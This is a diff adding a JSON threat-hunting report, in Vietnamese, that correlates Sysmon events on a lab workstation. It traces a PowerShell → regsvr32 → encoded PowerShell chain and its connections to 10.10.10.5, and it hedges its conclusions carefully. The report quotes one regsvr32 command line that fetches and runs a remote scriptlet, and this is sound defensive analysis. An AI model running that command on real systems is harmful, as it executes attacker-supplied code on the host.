@@ -1,0 +1,75 @@
+{
+  "schema_version": "threat-hunting-report/v1",
+  "verdict": "SUSPICIOUS",
+  "direct_answer": "Trên host WORKSTATION5.mordor.local, regsvr32.exe với GUID {b59756a9-b238-5f17-5207-000000000400} và PID 9384 có 1 Sysmon Event ID 3 đến 10.10.10.5:8444 (jsonl:line:1001); powershell.exe con với GUID {b59756a9-b239-5f17-5307-000000000400} và PID 9076 có 9 Sysmon Event ID 3 đến 10.10.10.5:80 (jsonl:line:1189, jsonl:line:1192, jsonl:line:1213, jsonl:line:1284, jsonl:line:1323, jsonl:line:1363, jsonl:line:1401, jsonl:line:1437, jsonl:line:2154). Mỗi process creation được dedup giữa Sysmon Event ID 1 và Security Event ID 4688; PID reuse bị giới hạn bởi host/GUID/lifetime và dừng tại creation/exit tiếp theo.",
+  "executive_summary": "Chuỗi quan sát được là PowerShell cha → regsvr32.exe với tham số /i:http://10.10.10.5:8444/launcher.sct → PowerShell con mã hóa; regsvr32 có 1 kết nối đến cổng 8444 và PowerShell con có 9 kết nối đến cổng 80. Các liên kết process/network là inferred từ host/GUID/lifetime, không chứng minh HTTP completion, nội dung truyền, C2 purpose hay exfiltration.",
+  "technical_analysis": "Tất cả observations nằm trên WORKSTATION5.mordor.local. GUID phân biệt các process: PowerShell cha bên ngoài {b59756a9-89dc-5f17-1006-000000000400} PID 8648 (creation không có trong capture, chỉ suy từ parent fields trong observation của regsvr32); regsvr32.exe {b59756a9-b238-5f17-5207-000000000400} PID 9384; PowerShell con {b59756a9-b239-5f17-5307-000000000400} PID 9076; conhost.exe {b59756a9-b239-5f17-5407-000000000400} PID 4856. regsvr32 có command line /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll và 1 Sysmon Event ID 3 đến 10.10.10.5:8444 tại 2020-07-22T03:27:55.955000Z. PowerShell con có 9 Sysmon Event ID 3 đến 10.10.10.5:80 trong khoảng 2020-07-22T03:27:57.014000Z đến 2020-07-22T03:28:28.429000Z. Dedup creation: regsvr32 có hai views tại jsonl:line:97 và jsonl:line:219; PowerShell con có hai views tại jsonl:line:224 và jsonl:line:283; conhost có hai views tại jsonl:line:240 và jsonl:line:296; mỗi cặp được tính là một creation. PID reuse: correlation policy dùng host/GUID/lifetime, PID fallback tối đa 120 giây và dừng tại creation/exit tiếp theo; GUID có image/lifetime xung đột bị reject; ambiguous links được giữ riêng. Trong slice này ambiguous_link_count=0, nhưng 14 unresolved connections không bị forced và 1 background connection bị excluded, nên chúng không nằm trong 10 observations đã bind. Sysmon Event ID 3 chỉ hỗ trợ network connection/endpoint, không chứng minh HTTP completion, nội dung truyền, số byte hoặc exfiltration.",
+  "attack_chain": [
+    {
+      "step_number": 1,
+      "source_entity": "powershell.exe external parent (GUID {b59756a9-89dc-5f17-1006-000000000400}, PID 8648)",
+      "action": "process_spawn",
+      "target_entity": "regsvr32.exe (GUID {b59756a9-b238-5f17-5207-000000000400}, PID 9384)",
+      "evidence_ref": "jsonl:line:97",
+      "timestamp": "2020-07-22T03:27:53.548000Z"
+    },
+    {
+      "step_number": 2,
+      "source_entity": "regsvr32.exe (GUID {b59756a9-b238-5f17-5207-000000000400}, PID 9384)",
+      "action": "process_spawn",
+      "target_entity": "powershell.exe child (GUID {b59756a9-b239-5f17-5307-000000000400}, PID 9076)",
+      "evidence_ref": "jsonl:line:224",
+      "timestamp": "2020-07-22T03:27:54.604000Z"
+    },
+    {
+      "step_number": 3,
+      "source_entity": "regsvr32.exe (GUID {b59756a9-b238-5f17-5207-000000000400}, PID 9384)",
+      "action": "network_connect",
+      "target_entity": "10.10.10.5:8444",
+      "evidence_ref": "jsonl:line:1001",
+      "timestamp": "2020-07-22T03:27:55.955000Z"
+    },
+    {
+      "step_number": 4,
+      "source_entity": "powershell.exe child (GUID {b59756a9-b239-5f17-5307-000000000400}, PID 9076)",
+      "action": "network_connect",
+      "target_entity": "10.10.10.5:80",
+      "evidence_ref": "jsonl:line:1189",
+      "timestamp": "2020-07-22T03:27:57.014000Z"
+    }
+  ],
+  "mitre_mappings": [],
+  "sigma_matches": [],
+  "containment_recommendations": [],
+  "unverified_claims": [
+    "Sysmon Event ID 3 chỉ hỗ trợ network connection/endpoint theo fields; không chứng minh HTTP exchange đã hoàn tất, nội dung truyền, số byte hoặc exfiltration.",
+    "PowerShell cha bên ngoài không có creation observation trong capture; identity của nó chỉ dựa trên parent fields trong observation của regsvr32.",
+    "Liên kết process/network là inferred từ host/GUID/lifetime; PID fallback bị giới hạn 120 giây và dừng tại creation/exit tiếp theo, nên PID reuse không được suy như cùng process.",
+    "14 unresolved connections không bị forced và 1 background connection bị excluded không được tính vào 10 observations đã bind; identity/process binding của chúng chưa được chứng minh.",
+    "Command line mã hóa của PowerShell con được quan sát nhưng completion/output của nó chưa được chứng minh.",
+    "CTI context là thông tin kỹ thuật bên ngoài, không chứng minh compromise cục bộ, HTTP completion hoặc C2 đã xác nhận."
+  ],
+  "evidence_refs": [
+    "creation-process-1356a3e1f91322ca",
+    "creation-process-1a7b3c442952cc5a",
+    "creation-process-73835839c8774e70",
+    "connections-process-1356a3e1f91322ca",
+    "connections-process-1a7b3c442952cc5a",
+    "jsonl:line:97",
+    "jsonl:line:219",
+    "jsonl:line:1001",
+    "jsonl:line:224",
+    "jsonl:line:283",
+    "jsonl:line:240",
+    "jsonl:line:296",
+    "jsonl:line:1189",
+    "jsonl:line:1192",
+    "jsonl:line:1213",
+    "jsonl:line:1284",
+    "jsonl:line:1323",
+    "jsonl:line:1363",
+    "jsonl:line:1401",
+    "jsonl:line:1437",
+    "jsonl:line:2154"
+  ]
+}
